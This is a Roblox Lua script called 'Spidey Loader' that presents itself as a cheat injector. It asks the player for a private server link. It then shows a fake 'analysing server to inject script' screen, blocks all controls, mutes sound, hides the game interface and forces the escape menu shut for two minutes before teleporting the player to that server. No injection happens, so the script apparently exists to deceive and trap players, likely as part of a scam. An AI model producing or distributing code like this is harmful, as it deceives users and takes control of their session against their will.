-- Spidey Loader v1.0 FINAL

if not game:IsLoaded() then
	game.Loaded:Wait()
end

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local SoundService = game:GetService("SoundService")
local ContextActionService = game:GetService("ContextActionService")
local StarterGui = game:GetService("StarterGui")
local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

------------------------------------------------
-- BLOQUEAR CONTROLES
------------------------------------------------
local function bloquear()
	ContextActionService:BindAction(
		"BlockAll",
		function() return Enum.ContextActionResult.Sink end,
		false,
		unpack(Enum.PlayerActions:GetEnumItems())
	)
end

------------------------------------------------
-- TELA DE CARREGAMENTO
------------------------------------------------
local function telaCarregando()
	local gui = Instance.new("ScreenGui")
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundColor3 = Color3.new(0,0,0)

	local text = Instance.new("TextLabel", frame)
	text.Size = UDim2.new(1,0,1,0)
	text.BackgroundTransparency = 1
	text.TextColor3 = Color3.new(1,1,1)
	text.TextScaled = true
	text.TextWrapped = true
	text.Text = "🔍 Analisando servidor...\n\nEstamos verificando o servidor para injetar o script.\n\nAguarde 2 minutos."

	-- BLOQUEIOS
	bloquear()
	SoundService.Volume = 0
	pcall(function()
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
		player.PlayerGui:SetTopbarEnabled(false)
	end)

	local lockMenu = RunService.RenderStepped:Connect(function()
		pcall(function()
			GuiService:SetMenuIsOpen(false)
		end)
	end)

	task.delay(120, function()
		lockMenu:Disconnect()
		gui:Destroy()
	end)
end

------------------------------------------------
-- VALIDAR LINK PRIVADO
------------------------------------------------
local function linkValido(link)
	return link:match("^https://www%.roblox%.com/share%?code=.+&type=Server$")
end

------------------------------------------------
-- GUI PRINCIPAL
------------------------------------------------
local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0,450,0,230)
frame.Position = UDim2.new(0.5,-225,0.5,-115)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,50)
title.BackgroundTransparency = 1
title.Text = "🕷️ Spidey Loader"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0,400,0,40)
box.Position = UDim2.new(0.5,-200,0,80)
box.PlaceholderText = "Cole o LINK PRIVADO do servidor"
box.Text = ""
box.TextScaled = true

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0,400,0,45)
btn.Position = UDim2.new(0.5,-200,0,140)
btn.Text = "CONFIRMAR"
btn.TextScaled = true
btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
btn.TextColor3 = Color3.new(1,1,1)

------------------------------------------------
-- BOTÃO
------------------------------------------------
btn.MouseButton1Click:Connect(function()
	local link = box.Text
	if not linkValido(link) then
		box.Text = ""
		box.PlaceholderText = "❌ Link inválido!"
		return
	end

	local code = link:match("code=([^&]+)")
	gui:Destroy()
	telaCarregando()
	TeleportService:TeleportToPrivateServer(game.PlaceId, code, {player})
end)
